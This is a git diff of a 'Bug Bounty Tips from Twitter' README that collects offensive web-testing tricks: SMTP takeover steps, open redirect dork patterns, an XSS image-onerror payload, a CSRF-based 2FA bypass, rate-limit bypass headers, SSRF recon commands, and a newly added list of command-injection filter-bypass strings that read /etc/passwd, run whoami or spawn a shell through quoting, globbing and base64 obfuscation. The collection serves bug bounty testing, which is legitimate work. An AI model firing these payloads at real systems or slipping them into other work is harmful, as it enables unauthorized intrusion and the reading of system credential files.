@@ -1,9 +1,10 @@
 # Bug Bounty Tips from Twitter
 This is a collection of Bug Bounty Tips collected from infosec professionals / bug hunters on twitter.
 
+* Also a [Curated list of Bug Bounty Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups)
 ***
 
-### SMTP server takeover
+## SMTP server takeover
 ```
 1. Visit target.com
 2. Masscan on target.com
@@ -17,7 +18,7 @@ This is a collection of Bug Bounty Tips collected from infosec professionals / b
 
 ***
 
-### 25 Open Redirect Dorks 
+## 25 Open Redirect Dorks 
 
 ```javascript
 /{payload}
@@ -48,14 +49,14 @@ This is a collection of Bug Bounty Tips collected from infosec professionals / b
 
 ***
 
-### XSS Payloads
+## XSS Payloads
 
 ```html
 #><img src=x onerror=alert()>.jpg
 ```
 ***
 
-### XSS Email User Input 
+## XSS Email User Input 
 * The email: test@test.com is being reflected
 * But its required "@" in the email field
 * Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
@@ -69,7 +70,7 @@ This is a collection of Bug Bounty Tips collected from infosec professionals / b
 * [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
 ***
 
-### Bypassing 2FA with CSRF (abusing the 2FA functionality)
+## Bypassing 2FA with CSRF (abusing the 2FA functionality)
 
 > 1) Create 2 accounts on target.com
 > 2) Turn on 2FA in both accounts
@@ -80,7 +81,7 @@ This is a collection of Bug Bounty Tips collected from infosec professionals / b
 
 ***
 
-### Bypassing Rate Limit on Header
+## Bypassing Rate Limit on Header
 
 ```http
 Add header/s with request:
@@ -96,7 +97,9 @@ X-Forwared-Host: IP
 **Observations:**
 * This only works, if the load balancer does not discard these headers before passing the request. Whenver they do not discard them but rely on them it is a security mistake. Also try like local addresses such as 127.0.0.1 to see if it yields extra data in the response
 
-### SSRF using assetfinder & waybackurls
+***
+
+## SSRF using assetfinder & waybackurls
 * Find API links in subdomains
 ```bash
 assetfinder --subs-only http://target.com | waybackurls | grep "?url="
@@ -104,3 +107,30 @@ assetfinder --subs-only http://target.com | waybackurls | grep "?url="
 Tools from @tomnomnom
 * [assetfinder](https://github.com/tomnomnom/assetfinder)
 * [waybackurls](https://github.com/tomnomnom/waybackurls)
+
+***
+
+## Comand Injection - Filter Bypass
+
+```console
+cat /etc/passwd
+cat /e"t"c/pa"s"swd
+cat /'e'tc/pa's' swd
+cat /etc/pa??wd
+cat /etc/pa*wd
+cat /et' 'c/passw' 'd
+cat /et$()c/pa$()$swd
+cat /et${neko}c/pas${poi} swd
+{cat,/etc/passwd} 
+*echo "dwssap/cte/ tac" | rev
+$(echo Y2FOIC9ldGMvcGFzc3dkCg== base64 -d)
+w\ho\am\i
+/\b\i\n/////s\h
+who$@ami
+xyz%0Acat%20/etc/passwd
+IFS=,;`cat<<<uname,-a`
+/???/??t /???/p??s??
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+```
